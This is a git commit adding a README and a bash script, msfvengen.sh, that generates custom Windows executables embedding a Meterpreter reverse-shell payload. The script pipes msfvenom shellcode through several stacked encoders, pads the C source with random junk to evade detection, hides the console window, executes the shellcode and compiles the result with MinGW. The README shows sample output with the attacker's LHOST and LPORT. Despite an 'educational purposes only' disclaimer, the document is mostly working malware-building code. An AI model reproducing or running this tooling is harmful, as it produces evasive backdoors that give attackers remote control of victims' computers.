d7cc60b8f0293b7817aa308d7587cce46bc93adb
lonalore <lonalore@freemail.hu>
2016-08-09 17:54:11 +0200

    Initial commit.

--- README.md
+++ README.md
@@ -1,1 +1,70 @@
-# msfvengen
+# MSFVenGen
+
+MSFVenGen - Custom MSFVenom Executable Generator
+
+### Requirements
+
+- Linux
+- Wine + MinGW
+- Metasploit Framework
+
+### Usage
+
+    ./msfvengen.sh
+
+### Example output
+    MSFVenGen - Custom MSFVenom Executable Generator
+    > LHOST: 192.168.0.102
+    > LPORT: 4444
+    We will be using the windows/meterpreter/reverse_X payloads. Which would you like to use?
+    > windows/meterpreter/reverse_tcp
+    > How many cycles we encode our shellcode? 1
+    > Number of random seed to add some junk to the resulting C code source file: 1
+    
+    Cleaning out the ShellCode directory
+    Generating shellcode...
+    Attempting to read payload from STDIN...
+    Attempting to read payload from STDIN...
+    Attempting to read payload from STDIN...
+    Attempting to read payload from STDIN...
+    Found 1 compatible encoders
+    Attempting to encode payload with 1 iterations of generic/none
+    generic/none succeeded with size 333 (iteration=0)
+    generic/none chosen with final size 333
+    Payload size: 333 bytes
+    
+    Found 1 compatible encoders
+    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+    x86/shikata_ga_nai succeeded with size 360 (iteration=0)
+    x86/shikata_ga_nai chosen with final size 360
+    Payload size: 360 bytes
+    
+    Found 1 compatible encoders
+    Attempting to encode payload with 1 iterations of x86/jmp_call_additive
+    x86/jmp_call_additive succeeded with size 389 (iteration=0)
+    x86/jmp_call_additive chosen with final size 389
+    Payload size: 389 bytes
+    
+    Found 1 compatible encoders
+    Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+    x86/call4_dword_xor succeeded with size 416 (iteration=0)
+    x86/call4_dword_xor chosen with final size 416
+    Payload size: 416 bytes
+    
+    Found 1 compatible encoders
+    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+    x86/shikata_ga_nai succeeded with size 443 (iteration=0)
+    x86/shikata_ga_nai chosen with final size 443
+    Payload size: 443 bytes
+    Final size of c file: 1886 bytes
+    Saved as: /home/lonalore/msfvengen/ShellCode/test.c
+    Shellcode generated.
+    Cleaning it up...
+    Creating Headers...
+    Creating the first bit of fluff
+    Creating the execution bit...
+    Creating the last bit of fluff...
+    Merging the last of it together...
+    tcp-4444-826.exe SHA-1 Checksum is .. 088a3b485993622d450b534cead0ff5aa1701524 tcp-4444-826.exe
+    
+    Done!
---
+++ msfvengen.sh
@@ -0,0 +1,89 @@
+#!/bin/bash
+# This script is for educational purposes only. I am not responsible for your ignorance/stupidity.
+
+outputDir="/home/lonalore/msfvengen"
+mingwDir="/home/lonalore/.wine/drive_c/MinGW/bin"
+metasploitDir="/opt/metasploit-framework"
+shellDir="$outputDir/ShellCode"
+
+clear
+echo "MSFVenGen - Custom MSFVenom Executable Generator"
+
+if [ ! -d "$mingwDir" ]; then
+  echo "MinGW for Windows not found on this system. Please install it first."
+	exit
+fi
+
+read -p "> LHOST: " ip
+read -p "> LPORT: " lprt
+echo "We will be using the windows/meterpreter/reverse_X payloads. Which would you like to use?"
+read -p "> windows/meterpreter/reverse_" listenr
+read -p "> How many cycles we encode our shellcode? " enumber
+read -p "> Number of random seed to add some junk to the resulting C code source file: " seed
+
+echo
+
+if [ ! -d "$outputDir" ]; then
+  echo "Creating the out folder..."
+  mkdir $outputDir
+fi
+
+if [ ! -d "$shellDir" ]; then
+	echo "Creating the ShellCode folder..."
+	mkdir $shellDir
+fi
+
+if test "$(ls -A "$shellDir")"; then
+	echo "Cleaning out the ShellCode directory"
+	rm $shellDir/*
+fi
+
+cd $metasploitDir
+echo "Generating shellcode..."
+msfvenom -p windows/meterpreter/reverse_${listenr} LHOST=$ip LPORT=$lprt EXITFUNC=process --platform windows -e generic/none -i 1 -a x86 -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/jmp_call_additive -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/call4_dword_xor -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f c -o $shellDir/test.c
+cd $shellDir
+echo "Shellcode generated."
+echo "Cleaning it up..."
+sed '1d' test.c > aready.c
+echo "unsigned char micro[]=" > var
+cat var > ready.c
+cat aready.c >> ready.c
+echo "Creating Headers..."
+echo "#include <stdio.h>" >> temp
+#echo "#define _WIN32_WINNT 0x0500" >> temp
+echo "#include <windows.h>" >> temp
+echo 'unsigned char ufs[]=' >> temp
+echo "Creating the first bit of fluff"
+for (( i=1; i<=10000;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp2
+sed -i 's/$/"/' temp2
+sed -i 's/^/"/' temp2
+echo  ';' >> temp2
+cat temp2 >> temp
+cat ready.c >> temp
+mv temp ready2.c
+echo ";" >> ready2.c
+echo "Creating the execution bit..."
+echo "int main(void) { " >> ready2.c
+echo "HWND hWnd = GetConsoleWindow();" >> ready2.c
+echo "ShowWindow( hWnd, SW_HIDE );((void (*)())micro)();}" >> ready2.c
+mv ready2.c final.c
+echo "Creating the last bit of fluff..."
+echo 'unsigned char tap[]=' > temp3
+for (( i=1; i<=999999;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp4
+sed -i 's/$/"/' temp4
+sed -i 's/^/"/' temp4
+echo  ';' >> temp4
+cat temp4 >> temp3
+echo "Merging the last of it together..."
+cat temp3 >> final.c
+cd $mingwDir
+wine gcc.exe -o $outputDir/final.exe $shellDir/final.c -lwsock32
+cd $outputDir
+mv final.exe "$listenr-$lprt-$RANDOM.exe"
+filex=`ls -ct1 | head -1`
+sumx=`sha1sum $filex`
+echo $filex "SHA-1 Checksum is .." $sumx
+strip --strip-debug $filex
+
+echo
+echo "Done!"
